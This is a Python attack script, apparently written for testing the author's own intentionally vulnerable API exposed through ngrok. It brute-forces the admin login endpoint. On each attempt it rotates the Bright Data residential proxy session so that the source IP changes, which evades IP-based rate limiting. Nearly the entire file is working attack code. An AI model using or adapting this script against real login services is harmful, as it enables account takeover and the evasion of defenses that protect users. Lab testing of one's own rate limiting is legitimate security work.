#!/usr/bin/env python3
import requests
import time
import sys
import urllib3

# Desactivar advertencias de SSL para proxys (opcional)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import os

# Configuración de Bright Data (vía Variables de Entorno)
BD_USERNAME = os.getenv("BD_USERNAME")
BD_PASSWORD = os.getenv("BD_PASSWORD")
BD_HOST = os.getenv("BD_HOST", "brd.superproxy.io")
BD_PORT = os.getenv("BD_PORT", "22225")

if not BD_USERNAME or not BD_PASSWORD:
    print("[!] Error: Variables de entorno BD_USERNAME y BD_PASSWORD no definidas.")
    print("    Ejecuta con: BD_USERNAME='...' BD_PASSWORD='...' TARGET_URL='https://...' python3 brightdata_attack.py")
    sys.exit(1)

# Objetivo (Tu VULNERABLE-API expuesta por NGROK o similar)
# NOTA: Bright Data NO puede acceder a 'localhost' o 'vulnerable-api' interno.
TARGET_BASE = os.getenv("TARGET_URL", "https://TU-URL-NGROK.ngrok-free.app")
TARGET_URL = f"{TARGET_BASE}/api/login"
CHECK_IP_URL = f"{TARGET_BASE}/api/check-ip"

def get_proxy_url():
    """Construye la URL del proxy autenticado"""
    return f"http://{BD_USERNAME}:{BD_PASSWORD}@{BD_HOST}:{BD_PORT}"

def check_current_ip():
    """Verifica qué IP está usando el Proxy"""
    proxies = {
        "http": get_proxy_url(),
        "https": get_proxy_url()
    }
    try:
        # Usamos httpbin o la API propia para ver la IP de salida
        # r = requests.get("http://lumtest.com/myip.json", proxies=proxies, verify=False, timeout=10)
        # O contra nuestro objetivo si está público
        r = requests.get(CHECK_IP_URL, proxies=proxies, verify=False, timeout=10)
        print(f"[*] Salida Proxy: {r.text.strip()}")
        return r.text
    except Exception as e:
        print(f"[!] Error proxy: {e}")
        return None

def attack():
    print(f"[*] Iniciando ataque vía Bright Data Residential Proxies")
    print(f"[*] Host: {BD_HOST}:{BD_PORT}")
    print(f"[*] Zona: {BD_USERNAME}")
    
    print(f"[*] Zona: {BD_USERNAME}")

    print("\n[*] Probando conexión inicial...")
    check_current_ip()

    proxies = {
        "http": get_proxy_url(),
        "https": get_proxy_url()
    }

    # Ataque
    for i in range(1, 20):
        try:
            # En Bright Data, cada sesión cambia de IP si no se mantiene la sesión
            # O se puede añadir '-session-rand' al username para forzar rotación
            
            # Forzar rotación añadiendo random session ID al usuario (Feature de Bright Data)
            # Formato: username-session-RANDOM
            import random
            session_id = random.randint(1, 999999)
            user_rotated = f"{BD_USERNAME}-session-{session_id}"
            proxy_rotated = f"http://{user_rotated}:{BD_PASSWORD}@{BD_HOST}:{BD_PORT}"
            
            current_proxies = {
                "http": proxy_rotated,
                "https": proxy_rotated
            }

            payload = {
                "username": "admin",
                "password": f"pass_{i}" # Brute force
            }
            
            print(f"[{i}] Enviando petición (Session: {session_id})...")
            start = time.time()
            r = requests.post(TARGET_URL, json=payload, proxies=current_proxies, verify=False, timeout=15)
            latency = time.time() - start
            
            if r.status_code == 429:
                print(f"   ⛔ Bloqueado (Status 429). La IP no rotó correctamente.")
            elif r.status_code == 401:
                print(f"   ✅ Intento fallido (200/401) - Bypass Exitoso ({latency:.2f}s)")
            else:
                print(f"   ❓ Status: {r.status_code}")

        except Exception as e:
            print(f"   [!] Error: {e}")

if __name__ == "__main__":
    attack()
